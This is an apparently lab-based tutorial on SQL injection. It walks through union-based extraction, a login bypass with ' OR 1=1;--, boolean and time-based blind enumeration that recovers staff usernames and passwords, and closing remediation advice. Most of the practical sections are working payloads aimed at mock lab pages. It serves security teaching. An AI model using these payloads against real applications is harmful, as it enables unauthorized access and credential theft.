# In-Band SQLi

## Start Machine

### In-Band SQL Injection

In-Band SQL Injection is the easiest type to detect and exploit. It uses the same method of communication to exploit the vulnerability and receive the results. For example, discovering an SQL Injection vulnerability on a website page and extracting data from the database to the same page.

### Error-Based SQL Injection

This type of SQL Injection is useful for easily obtaining information about the database structure, as error messages from the database are printed directly to the browser screen. This can often be used to enumerate a whole database.

### Union-Based SQL Injection

This type of Injection utilizes the SQL UNION operator alongside a SELECT statement to return additional results to the page. This method is the most common way of extracting large amounts of data via an SQL Injection vulnerability.

## Practical

Click the green "Start Machine" button to use the SQL Injection Example practice lab. Each level contains a mock browser and also SQL Query and Error boxes to assist in getting your queries/payload correct.

### Level One

Level one of the practice lab contains a mock browser and website featuring a blog with different articles, which can be accessed by changing the id number in the query string.

1. Try typing an apostrophe ( ' ) after the id=1 and press enter. You'll see this returns an SQL error informing you of an error in your syntax. This confirms the existence of an SQL Injection vulnerability.
2. Use the UNION operator to return data to the browser without displaying an error message. Try setting the mock browser's id parameter to:
    ```
    1 UNION SELECT 1
    ```
    This should produce an error message about the number of columns. Add more columns until the error message disappears:
    ```
    1 UNION SELECT 1,2
    1 UNION SELECT 1,2,3
    ```
3. Change the article ID from 1 to 0 to get the first query to produce no results:
    ```
    0 UNION SELECT 1,2,3
    ```
4. Retrieve the database name:
    ```
    0 UNION SELECT 1,2,database()
    ```
5. Gather a list of tables in the database:
    ```
    0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'
    ```
6. Find the structure of the `staff_users` table:
    ```
    0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'
    ```
7. Retrieve the user's information:
    ```
    0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users
    ```

### Blind SQLi - Authentication Bypass

#### Blind SQLi

Unlike In-Band SQL injection, where we can see the results of our attack directly on the screen, blind SQLi is when we get little to no feedback to confirm whether our injected queries were successful. This is because the error messages have been disabled, but the injection still works regardless.

#### Authentication Bypass

One of the most straightforward Blind SQL Injection techniques is bypassing authentication methods such as login forms. We just need to create a database query that replies with a yes/true.

**Practical:**

Level Two of the SQL Injection examples shows this exact example. The query to the database is:
```
select * from users where username='%username%' and password='%password%' LIMIT 1;
```
To make this query always return true, enter the following into the password field:
```
' OR 1=1;--
```
This turns the SQL query into:
```
select * from users where username='' and password='' OR 1=1;
```
Because 1=1 is a true statement and we've used an OR operator, this will always cause the query to return true, satisfying the web application's logic that the database found a valid username/password combination and that access should be allowed.

### Blind SQLi - Boolean Based

Boolean-based SQL Injection refers to the response we receive from our injection attempts, which could be a true/false, yes/no, on/off, 1/0 or any response that can only have two outcomes. That outcome confirms that our SQL Injection payload was either successful or not. On the first inspection, you may feel like this limited response can't provide much information. Still, with just these two responses, it's possible to enumerate a whole database structure and contents.

**Practical:**

On level three of the SQL Injection Examples Machine, you're presented with a mock browser with the following URL:

```
https://website.thm/checkuser?username=admin
```

The browser body contains `{"taken":true}`. This API endpoint replicates a common feature found on many signup forms, which checks whether a username has already been registered to prompt the user to choose a different username. Because the taken value is set to true, we can assume the username admin is already registered. We can confirm this by changing the username in the mock browser's address bar from admin to admin123, and upon pressing enter, you'll see the value taken has now changed to false.

The SQL query that is processed looks like the following:

```
select * from users where username = '%username%' LIMIT 1;
```

The only input we have control over is the username in the query string, and we'll have to use this to perform our SQL injection. Keeping the username as admin123, we can start appending to this to try and make the database confirm true things, changing the state of the taken field from false to true.

Like in previous levels, our first task is to establish the number of columns in the users' table, which we can achieve by using the UNION statement. Change the username value to the following:

```
admin123' UNION SELECT 1;-- 
```

As the web application has responded with the value taken as false, we can confirm this is the incorrect value of columns. Keep on adding more columns until we have a taken value of true. You can confirm that the answer is three columns by setting the username to the below value:

```
admin123' UNION SELECT 1,2,3;-- 
```

Now that our number of columns has been established, we can work on the enumeration of the database. Our first task is to discover the database name. We can do this by using the built-in database() method and then using the like operator to try and find results that will return a true status.
Try the below username value and see what happens:

```
admin123' UNION SELECT 1,2,3 where database() like '%';--
```

We get a true response because, in the like operator, we just have the value of %, which will match anything as it's the wildcard value. If we change the wildcard operator to a%, you'll see the response goes back to false, which confirms that the database name does not begin with the letter a. We can cycle through all the letters, numbers and characters such as - and _ until we discover a match. If you send the below as the username value, you'll receive a true response that confirms the database name begins with the letter s.

```
admin123' UNION SELECT 1,2,3 where database() like 's%';--
```

Now you move on to the next character of the database name until you find another true response, for example, 'sa%', 'sb%', 'sc%', etc. Keep on with this process until you discover all the characters of the database name, which is sqli_three.

We've established the database name, which we can now use to enumerate table names using a similar method by utilising the information_schema database. Try setting the username to the following value:

```
admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';--
```

This query looks for results in the information_schema database in the tables table where the database name matches sqli_three, and the table name begins with the letter a. As the above query results in a false response, we can confirm that there are no tables in the sqli_three database that begin with the letter a. Like previously, you'll need to cycle through letters, numbers and characters until you find a positive match.

You'll finally end up discovering a table in the sqli_three database named users, which you can confirm by running the following username payload:

```
admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name='users';--
```

Lastly, we now need to enumerate the column names in the users table so we can properly search it for login credentials. Again, we can use the information_schema database and the information we've already gained to query it for column names. Using the payload below, we search the columns table where the database is equal to sqli_three, the table name is users, and the column name begins with the letter a.

```
admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%';
```

Again,  you'll need to cycle through letters, numbers and characters until you find a match. As you're looking for multiple results, you'll have to add this to your payload each time you find a new column name to avoid discovering the same one. For example, once you've found the column named id, you'll append that to your original payload (as seen below).

```
admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%' and COLUMN_NAME !='id';
```

Repeating this process three times will enable you to discover the columns' id, username and password. Which now you can use to query the users table for login credentials. First, you'll need to discover a valid username, which you can use the payload below:

```
admin123' UNION SELECT 1,2,3 from users where username like 'a%
```

Once you've cycled through all the characters, you will confirm the existence of the username admin. Now you've got the username. You can concentrate on discovering the password. The payload below shows you how to find the password:

```
admin123' UNION SELECT 1,2,3 from users where username='admin' and password like 'a%
```

Cycling through all the characters, you'll discover the password is 3845.

### Blind SQLi - Time Based

A time-based blind SQL injection is very similar to the above boolean-based one in that the same requests are sent, but there is no visual indicator of your queries being wrong or right this time. Instead, your indicator of a correct query is based on the time the query takes to complete. This time delay is introduced using built-in methods such as SLEEP(x) alongside the UNION statement. The SLEEP() method will only ever get executed upon a successful UNION SELECT statement. 

So, for example, when trying to establish the number of columns in a table, you would use the following query:

```
admin123' UNION SELECT SLEEP(5);--
```

If there was no pause in the response time, we know that the query was unsuccessful, so like on previous tasks, we add another column:

```
admin123' UNION SELECT SLEEP(5),2;--
```

This payload should have produced a 5-second delay, confirming the successful execution of the UNION statement and that there are two columns.

You can now repeat the enumeration process from the Boolean-based SQL injection, adding the SLEEP() method to the UNION SELECT statement.
If you're struggling to find the table name, the below query should help you on your way:

```
referrer=admin123' UNION SELECT SLEEP(5),2 where database() like 'u%';--
```

## Remediation

As impactful as SQL Injection vulnerabilities are, developers do have a way to protect their web applications from them by following the advice below:

### Prepared Statements (With Parameterized Queries)

In a prepared query, the first thing a developer writes is the SQL query, and then any user inputs are added as parameters afterwards. Writing prepared statements ensures the SQL code structure doesn't change and the database can distinguish between the query and the data. As a benefit, it also makes your code look much cleaner and easier to read.

### Input Validation

Input validation can go a long way to protecting what gets put into an SQL query. Employing an allow list can restrict input to only certain strings, or a string replacement method in the programming language can filter the characters you wish to allow or disallow. 

### Escaping User Input

Allowing user input containing characters such as ' " $ \ can cause SQL Queries to break or, even worse, as we've learnt, open them up for injection attacks. Escaping user input is the method of prepending a backslash (\) to these characters, which then causes them to be parsed just as a regular string and not a special character.